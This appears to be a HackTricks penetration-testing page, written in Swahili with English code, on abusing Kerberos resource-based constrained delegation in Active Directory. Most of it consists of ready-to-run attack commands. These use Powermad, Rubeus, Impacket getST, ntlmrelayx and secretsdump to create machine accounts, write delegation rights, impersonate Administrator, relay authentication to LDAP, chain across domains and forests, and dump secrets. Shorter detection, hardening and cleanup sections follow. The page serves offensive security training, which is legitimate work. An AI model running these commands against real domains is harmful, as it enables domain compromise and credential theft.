# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Misingi ya Resource-based Constrained Delegation

Resource-based constrained delegation (RBCD) inafanana na [constrained delegation](constrained-delegation.md), lakini mwelekeo wa uaminifu umegeuzwa. Constrained delegation ya kawaida hurekodi huduma ambazo principal inaweza kuzi-delegate; RBCD hurekodi kwenye **resource lengwa** principals zinazoweza kuiga watumiaji wanapofikia resource hiyo.<sup>[[12]](#references)</sup>

Sifa ya _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ ya object lengwa huwa na security descriptor inayobainisha principals zinazoruhusiwa kutenda kwa niaba ya identities nyingine ili kufikia resource hiyo.

Tofauti nyingine muhimu ni kwamba principal yenye **ruhusa za kuandika kwenye machine account** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty`, na haki zinazofanana) inaweza kuweza kuweka _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. Kwa kawaida, kusanidi constrained delegation ya kawaida huhitaji ufikiaji wa kiutawala wenye mamlaka zaidi.<sup>[[1]](#references)</sup>

Kwa usahihi zaidi, kubadilisha mipangilio ya classic constrained-delegation kwa kawaida huhitaji `SeEnableDelegationPrivilege` kwenye domain controller; haki hii kwa kawaida huwa tu kwa wasimamizi wenye mamlaka makubwa. RBCD huhamishia uamuzi kwenye security descriptor ya object lengwa, hivyo ruhusa ya kuandika sifa husika ya computer-object inaweza kutosha bila kuwa na haki hiyo ya mtumiaji.<sup>[[1]](#references)[[2]](#references)</sup>

### Dhana Mpya

Bendera ya **`TrustedToAuthForDelegation`** katika `userAccountControl` mara nyingi huelezwa kuwa sharti la **S4U2Self**, lakini maelezo hayo hayajakamilika.\
Service principal yenye SPN inaweza kuomba S4U2Self bila bendera hiyo. Bendera ya `TrustedToAuthForDelegation` ikiwa imewekwa, service ticket inayorejeshwa huwa **forwardable**; ikiwa haijawekwa, ticket kwa kawaida huwa **non-forwardable**.<sup>[[5]](#references)</sup>

Constrained delegation ya kawaida hukataa **TGS isiyo forwardable** katika hatua ya S4U2Proxy. RBCD inaweza kukubali ticket hiyo ya S4U2Self ikiwa security descriptor ya lengwa imeidhinisha huduma inayoomba.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Muundo wa shambulio

> Ikiwa una **haki zinazolingana na ruhusa za kuandika** kwenye **computer account**, unaweza kupata ufikiaji wa kimamlaka kwenye mashine hiyo.

Tuseme mshambuliaji tayari ana **haki zinazolingana na ruhusa za kuandika kwenye victim computer object**.

1. Mshambuliaji **huingilia** akaunti yenye **SPN** au **huunda moja** ("Service A"). Kwa chaguomsingi, mtumiaji wa domain aliyeidhinishwa anaweza kuunda hadi computer objects 10, kulingana na **_MachineAccountQuota_**; computer object hujipatia SPNs zinazoweza kutumika kiotomatiki.
2. Mshambuliaji **hutumia vibaya ruhusa yake ya WRITE** kwenye victim computer (ServiceB) ili kusanidi **resource-based constrained delegation na kuruhusu ServiceA kuiga mtumiaji yeyote** anapofikia victim computer hiyo (ServiceB).
3. Mshambuliaji hutumia Rubeus kutekeleza **shambulio kamili la S4U** (S4U2Self na S4U2Proxy) kutoka Service A hadi Service B, kwa niaba ya mtumiaji **mwenye ufikiaji wa kimamlaka kwenye Service B**.
   1. S4U2Self (kutoka kwenye akaunti ya SPN iliyoingiliwa au iliyoundwa): omba **TGS inayomwakilisha Administrator kwenda Service A** (non-forwardable).
   2. S4U2Proxy: tumia **TGS hiyo isiyo forwardable** kuomba service ticket inayomwakilisha **Administrator** kwenda kwa **host lengwa**.
   3. Ticket isiyo forwardable bado inaweza kufanya kazi katika mtiririko huu wa RBCD kwa sababu Service A imeidhinishwa kwenye security descriptor ya resource lengwa.
4. Mshambuliaji anaweza kutumia **pass-the-ticket** na **kuiga** mtumiaji ili kupata **ufikiaji wa victim ServiceB**.<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` hufunga njia chaguomsingi ya kuunda computer, lakini haiondoi ruhusa za kuandika kwenye target computer object wala udhibiti wa akaunti iliyopo. Mtumiaji wa kawaida unayemdhibiti asiye na SPN wakati mwingine anaweza kutumiwa kama principal inayofanya delegation kupitia [SPN-less U2U method](#spn-less-cross-domain--cross-forest-rbcd), ikiwemo ndani ya domain moja. Njia hiyo bado inahitaji haki halali ya kuandika RBCD, udhibiti wa credentials za mtumiaji anayefanya delegation, identity inayoweza kuigwa na ku-delegatiwa, tabia inayooana ya usimbaji fiche wa Kerberos, na mabadiliko ya NT-hash yanayoathiri akaunti. Zichukulie hizi kama masharti tofauti; sifa tupu ya RBCD au quota ya sifuri pekee havithibitishi mafanikio wala usalama.

Descriptor ya RBCD iliyopo inaweza pia kutaja **group** badala ya computer inayofanya delegation moja kwa moja. Ikiwa unadhibiti computer account yenye SPN na unaweza kuiongeza kwenye group hiyo, uanachama huo mpya unaweza kutoa njia ya delegation bila kubadilisha sifa ya RBCD ya target computer. Kabla ya kuhitimisha kuwa njia hiyo inafanya kazi, kagua ACL inayodhibiti ruhusa halisi za kubadilisha uanachama wa group (ikiwemo deny ACEs), uanachama wa nested na kusasishwa kwa token, trustee SID ya descriptor, vizuizi vya delegation vya akaunti inayoigwa, na target service SPN.

Ili kukagua _**MachineAccountQuota**_ ya domain, unaweza kutumia:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Shambulio

### Kuunda Kitu cha Kompyuta

Unaweza kuunda kitu cha kompyuta ndani ya domain ukitumia **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Kusanidi Resource-based Constrained Delegation

**Kwa kutumia moduli ya Active Directory PowerShell**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**Kutumia powerview**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Kufanya shambulizi kamili la S4U (Windows/Rubeus)

Kwanza kabisa, tuliunda object mpya ya Computer kwa kutumia nenosiri `123456`, kwa hivyo tunahitaji hash ya nenosiri hilo:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Hii itachapisha hashes za RC4 na AES za akaunti hiyo.\
Sasa, shambulio linaweza kutekelezwa:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Unaweza kutengeneza tiketi zaidi za huduma zaidi kwa kuuliza mara moja tu ukitumia param ya `/altservice` ya Rubeus:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Watumiaji wanaweza kuwekwa alama ya **"Account is sensitive and cannot be delegated."** Ikiwa alama hiyo imewashwa, akaunti haiwezi kuigizwa kupitia mtiririko huu wa delegation. BloodHound huonyesha sifa hii wakati wa uchanganuzi.

### Zana za Linux: RBCD kuanzia mwanzo hadi mwisho kwa kutumia Impacket (2024+)

Ukitumia Linux, unaweza kutekeleza mnyororo mzima wa RBCD kwa kutumia zana rasmi za Impacket:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Notes
- Ikiwa LDAP signing/LDAPS inatekelezwa, tumia `impacket-rbcd -use-ldaps ...`.
- Pendelea funguo za AES; domains nyingi za kisasa huzuia RC4. Impacket na Rubeus zote zinaunga mkono mtiririko wa AES pekee.
- Impacket inaweza kuandika upya `sname` ("AnySPN") kwa baadhi ya zana, lakini pata SPN sahihi kila inapowezekana (kwa mfano, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD ya domains tofauti na forests tofauti

Ikiwa **principal inayofanya delegation** unayoidhibiti iko kwenye **domain tofauti** (au hata **forest tofauti**) na **kompyuta ya resource**, bado huu ni matumizi mabaya ya **RBCD**, lakini mtiririko wa tiketi si tena ule wa kawaida wa domain moja wa `S4U2Self -> S4U2Proxy`.

### RBCD ya domain tofauti: sanidi principal ya nje kwa kutumia SID

Unapoweka `msDS-AllowedToActOnBehalfOfOtherIdentity` kutoka **domain tofauti**, huenda mashine/mtumiaji wa nje **asiweze kutatuliwa kwa jina** katika LDAP ya domain lengwa. Katika hali hiyo, sanidi ingizo la delegation kwa kutumia **SID** ya principal wa nje badala ya sAMAccountName/UPN yake.

Hili ni muhimu hasa unapofanya relay ya NTLM kwenda LDAP kwa kutumia `ntlmrelayx.py`:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Maelezo:
- `--sid` huiambia `ntlmrelayx.py` ichukulie `--escalate-user` kama SID, jambo linalohitajika wakati akaunti inayokabidhi mamlaka ni ya nje ya domain lengwa.
- Hata kama zana itaonyesha `User not found in LDAP`, uandishi wa delegation bado unaweza kufanikiwa kwa sababu security descriptor huhifadhi SID ya nje moja kwa moja.

### RBCD ya domain-to-domain: mfuatano wa cross-realm S4U

Mara principal ya nje inapokuwa kwenye `msDS-AllowedToActOnBehalfOfOtherIdentity`, mtiririko wa cross-domain unaofanya kazi ni:<sup>[[9]](#references)[[13]](#references)</sup>

1. Pata **TGT** ya principal inayokabidhi mamlaka kutoka domain yake yenyewe.
2. Omba **referral TGT** ya `krbtgt/<target-domain>`.
3. Omba **cross-realm S4U2Self referral** ya mtumiaji anayeigwa kwenye DC ya target-domain.
4. Omba tiketi halisi ya **S4U2Self** ya mtumiaji huyo tena kwenye domain ya delegator.
5. Tekeleza **S4U2Proxy** kwenye domain ya delegator ili kupata referral ticket ya target domain.
6. Tekeleza **S4U2Proxy** ya mwisho kwenye DC ya target-domain ili kupata service ticket ya `cifs/host.target`, `host/host.target`, n.k.

Hii ndiyo sababu zana za Linux za kawaida mara nyingi hushindwa katika cross-domain RBCD:<sup>[[9]](#references)</sup>
- **realm** ya ombi huenda ikahitaji kuwa tofauti na realm ya TGT iliyotumika kwenye `TGS-REQ`
- mfuatano huu unahitaji hatua **huru za S4U2Proxy**, si `S4U2Self` pekee au `S4U2Self` ikifuatiwa mara moja na `S4U2Proxy` moja

### RBCD ya cross-domain kutoka Linux

Synacktiv ilichapisha utekelezaji wa Impacket `getST.py` unaotumia Linux kuiga mfuatano wa cross-realm kwa kushughulikia KDC mbili moja kwa moja:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Kiutendaji, arguments mpya ni:
- `-dc-ip`: DC ya domain **inayokabidhi**
- `-targetdomain`: domain ya **kompyuta ya rasilimali**
- `-targetdc`: DC ya domain ya **rasilimali**

### Vikwazo vya RBCD kati ya forest

RBCD kati ya forest ina kikwazo muhimu: **mtumiaji anayeiga utambulisho wake lazima awe wa forest sawa na principal inayokabidhi**. Kwa maneno mengine, ikiwa akaunti ya mashine unayoidhibiti iko katika `valhalla.local` na rasilimali lengwa iko katika `asgard.local`, kwa kawaida **huwezi kuiga utambulisho wa watumiaji wowote wa `asgard.local` kwenye rasilimali hiyo kupitia RBCD**.<sup>[[9]](#references)</sup>

Bado inaweza kutumiwa ikiwa:
- mtumiaji wa **forest inayokabidhi** ni **local admin** (au ana mamlaka kwa njia nyingine) kwenye host ya rasilimali katika forest nyingine
- trust inaruhusu njia inayohitajika ya authentication na SID ya kigeni inakubaliwa katika security descriptor ya kompyuta lengwa

### Sifa za kipekee za protocol ya RBCD kati ya forest

RBCD kati ya forest si tu "kati ya domain pamoja na trust". Mtiririko ulioonekana una sifa mbili ambazo tooling ya kawaida haikuzingatia kihistoria:<sup>[[9]](#references)</sup>

1. Ombi la ziada la **S4U2Proxy** linaloweka **`PA-PAC-OPTIONS=branch-aware`**
2. Ticket ya mwisho ya service ambayo inaweza kurejeshwa kwa kutumia **RC4** hata wakati etypes nyingine ziliombwa

Mtiririko wa kiutendaji ni:

1. Pata TGT ya principal inayokabidhi katika forest A.
2. Omba **S4U2Self** kwa mtumiaji ambaye utambulisho wake unaigwa katika forest A.
3. Omba **S4U2Proxy** katika forest A ili kupata referral TGT ya forest B.
4. Tuma ombi la pili la **S4U2Proxy** katika forest A **bila** ticket ya S4U2Self kama ticket ya ziada, lakini ukiwasha `branch-aware`, ili kupata referral TGT nyingine ya forest B.
5. Kwa hiari, omba ticket ya kawaida ya service katika forest B kwa principal inayokabidhi (ticket hii haihitajiki kwa matumizi mabaya ya mwisho).
6. Tumia referral tickets za hatua za 3 na 4 kuomba ticket ya mwisho ya **S4U2Proxy** katika forest B, kwa mtumiaji wa forest A ambaye utambulisho wake unaigwa, kuelekea SPN lengwa.

### RBCD kati ya forest kutoka Linux

Tawi lilelile la Synacktiv Impacket linaongeza switch ya `-forest` kwa mantiki hii:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### RBCD ya kujirudia katika domains nyingi (3+ domains)

Katika **forests za domains nyingi**, **S4U2Self** na **S4U2Proxy** zinaweza kuwa **za kujirudia** badala ya kusimama baada ya referral moja:

- **S4U2Self ya kujirudia**: `S4U2Self` ya kwanza hutumwa kwenye **domain ya mtumiaji anayeigizwa**, hupitia hatua za kati za parent/child kwa kutumia referrals za kawaida za `TGS-REQ` za `krbtgt/<REALM>`, na **S4U2Self ya mwisho** hutumwa kwenye domain ya principal anayekabidhi.
- Hii inamaanisha kuwa **kuwa tu na TGT** ya akaunti ya mashine kunaweza kutosha kumwiga **admin kutoka domain nyingine katika forest hiyo hiyo** na kuomba `cifs/host`, `host/host`, `wsman/host`, n.k.
- **S4U2Proxy ya kujirudia** hufuata mnyororo wa trust kwa njia hiyo hiyo: hatua za kati hutumia tena tiketi iliyotangulia kama TGT huku zikiomba referral inayofuata ya `krbtgt/<REALM>`, na ni hatua ya mwisho pekee inayorejesha tiketi ya mwisho ya huduma.<sup>[[10]](#references)</sup>

Mfano wa vitendo ndani ya forest hiyo hiyo ni:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### RBCD ya cross-domain / cross-forest bila SPN

Ikiwa **delegating principal ni mtumiaji asiye na SPN**, `S4U2Self` ya mwisho katika mfuatano wa recursive hushindwa na **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Suluhisho ni **kujaribu tena hop ya mwisho pekee kama `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Muhtasari wa abuse chain:

1. Thibitisha utambulisho kwa kutumia **NT hash** ili KDC ielekezwe kutumia **RC4-HMAC (etype 23)**.
2. Omba **`-self -u2u`** kwanza na uiweke ticket hiyo kando na proxy step itakayofuata.
3. Toa **TGT session key** kwa kutumia `describeTicket.py`.
4. Badilisha **NT hash** ya mtumiaji iwe **session key** hiyo kwa kutumia `changepasswd.py -newhashes <session_key>`.
5. Tumia tena ticket ya `S4U2Self+U2U` kama **`-additional-ticket`** wakati wa ombi tofauti la **`-proxy`**.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Tahadhari za kiutendaji:

- Wakati **hop ya kwanza inayoaminika tayari ni forest nyingine**, pendelea algorithm ya **branch-aware** (`getST.py ... -forest`) ili ilingane na tabia asilia ya Windows. Ikiwa forest ya kigeni itafikiwa baadaye tu kwenye chain, mtiririko wa recursive usio branch-aware unaweza bado kufanya kazi.<sup>[[9]](#references)</sup>
- Kwenye DC za hivi karibuni za **Windows Server 2022/2025**, kulazimisha RC4 kunaweza kushindwa kwa **`KDC_ERR_ETYPE_NOSUPP`** kutokana na kuacha kutumia RC4; hii inaweza kufanya **RBCD isiyotumia SPN isiwezekane**, ingawa RBCD ya kawaida inayotumia SPN bado hufanya kazi kwa AES.<sup>[[15]](#references)</sup>
- Tekeleza **`S4U2Self+U2U` kabla ya kubadilisha hash/nenosiri la mtumiaji**: **`SamrChangePasswordUser`** haihesabu upya funguo za AES za Kerberos za akaunti, kwa hivyo kubadilisha nenosiri kwanza kunaweza kuvuruga maombi ya tiketi yanayofuata.<sup>[[14]](#references)</sup>
- Akaunti inayoigwa lazima bado iwe **inaweza kukabidhiwa**: **Protected Users** na akaunti zilizo na **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** huzuia chain.

## Vidokezo vya utambuzi / uimarishaji

- Njia za RBCD kati ya domains/forests kwa kawaida bado huundwa kupitia **matumizi mabaya ya ACL** au **relay-to-LDAP**. Weka **LDAP signing** na **LDAP channel binding** kwenye DCs ili kuzuia njia za kawaida za usanidi.
- Kagua ni nani anayeweza kuandika `msDS-AllowedToActOnBehalfOfOtherIdentity` kwenye computer objects na utambue SIDs zilizohifadhiwa, pamoja na **foreign security principals**.
- Katika mazingira yenye trust nyingi, kagua **Selective Authentication**, **SID filtering**, na ikiwa watumiaji kutoka forest ya kigeni wana haki za **local admin** kwenye resource hosts.

### Kufikia

Mstari wa mwisho wa amri utaendesha **shambulio kamili la S4U na kuingiza TGS** kutoka kwa Administrator hadi kwenye victim host kwenye **memory**.\
Katika mfano huu, TGS ya huduma ya **CIFS** iliombwa kutoka kwa Administrator, kwa hivyo utaweza kufikia **C$**:

```bash
ls \\victim.domain.local\C$
```

### Tumia vibaya tiketi tofauti za huduma

Jifunze kuhusu [**tiketi za huduma zinazopatikana hapa**](silver-ticket.md#available-services).

## Kuorodhesha, kukagua na kusafisha

### Kuorodhesha kompyuta zilizosanidiwa RBCD

PowerShell (kusimbua SD ili kutatua SIDs):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (soma au futa kwa amri moja):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### Usafishaji / kuweka upya RBCD

- PowerShell (futa attribute):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Makosa ya Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Hii inamaanisha kuwa Kerberos imesanidiwa kutotumia DES au RC4, na unatoa hash ya RC4 pekee. Mpe Rubeus angalau hash ya AES256 (au mpe hash za rc4, aes128 na aes256). Mfano: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** wakati wa kutumia `-self` kwa mtumiaji wa kawaida: kuna uwezekano mkuu kwamba principal inayofanya delegation **haina SPN**. Jaribu tena **hatua ya mwisho** kama **`S4U2Self+U2U`** badala ya `S4U2Self` ya kawaida.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** wakati wa kutumia **SPN-less RBCD**: DC za hivi karibuni zinaweza kukataa njia ya **RC4-HMAC** inayolazimishwa, ambayo inahitajika na mbinu ya `S4U2Self+U2U` + session-key-substitution. Jaribu njia ya kawaida ya **SPN-backed** RBCD ukitumia AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Hii inamaanisha kuwa saa ya kompyuta ya sasa inatofautiana na ya DC, kwa hivyo Kerberos haifanyi kazi ipasavyo.
- **`preauth_failed`**: Hii inamaanisha kuwa jina la mtumiaji + hash ulizotoa hazifanyi kazi kuingia. Huenda ulisahau kuweka "$" ndani ya jina la mtumiaji wakati wa kutengeneza hash (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Hii inaweza kumaanisha:
  - Mtumiaji unayejaribu kuiga hawezi kufikia huduma unayotaka (kwa sababu huwezi kumwiga au kwa sababu hana ruhusa za kutosha)
  - Huduma uliyoomba haipo (ukiomba tiketi ya winrm ilhali winrm haifanyi kazi)
  - Fakecomputer iliyoundwa imepoteza ruhusa zake kwenye seva iliyo hatarini, na unahitaji kuzirejesha.
  - Unatumia vibaya KCD ya kawaida; kumbuka kuwa RBCD hufanya kazi na tiketi za S4U2Self zisizo forwardable, ilhali KCD inahitaji forwardable.

## Vidokezo, relays na njia mbadala

- Unaweza pia kuandika RBCD SD kupitia AD Web Services (ADWS) ikiwa LDAP imechujwa. Tazama:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Minyororo ya Kerberos relay mara nyingi huishia kwenye RBCD ili kupata SYSTEM ya ndani kwa hatua moja. Tazama mifano ya vitendo ya kuanzia mwanzo hadi mwisho:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Ikiwa LDAP signing/channel binding **zimezimwa** na unaweza kuunda akaunti ya mashine, zana kama **KrbRelayUp** zinaweza kupeleka Kerberos auth iliyolazimishwa kwenda LDAP, kuweka `msDS-AllowedToActOnBehalfOfOtherIdentity` kwa akaunti ya mashine yako kwenye computer object lengwa, kisha mara moja kuiga **Administrator** kupitia S4U kutoka nje ya host.<sup>[[8]](#references)</sup>

## References

- [1] [Kumvuta Mbwa kwa Mkia: Kutumia Vibaya Resource-Based Constrained Delegation Kushambulia Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Neno Lingine Kuhusu Delegation – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Kudhibiti Computer Object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Kutumia Vibaya Resource-Based Constrained Delegation](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Iliua Domain: Muhtasari wa Kerberos kwa Mashambulizi](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (rasmi)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Cheatsheet fupi ya Linux yenye sintaksia ya hivi karibuni](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing imezimwa → Kerberos relay kwenda RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Kuchunguza RBCD kati ya domain na forest](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Kuchunguza RBCD kati ya domain na forest: sehemu ya 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Tawi la Impacket la Synacktiv - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Muhtasari wa Kerberos constrained delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - S4U2Self kati ya domain](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Kugundua na kurekebisha matumizi ya RC4 kwenye Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – Maelezo ya S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
